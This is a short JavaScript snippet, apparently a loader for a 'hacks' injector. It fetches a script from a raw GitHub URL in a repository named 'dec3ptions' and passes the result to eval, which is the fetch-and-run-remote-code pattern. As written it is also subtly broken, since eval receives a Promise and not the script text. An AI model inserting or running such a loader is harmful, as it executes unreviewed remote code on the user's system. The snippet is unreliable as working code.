let dec3ptions_injector = fetch('https://raw.githubusercontent.com/dec3ptions/dec3ptions/hacks/dec3ptions/main/main.js') 
  .then(response => response.text());
eval(dec3ptions_injector);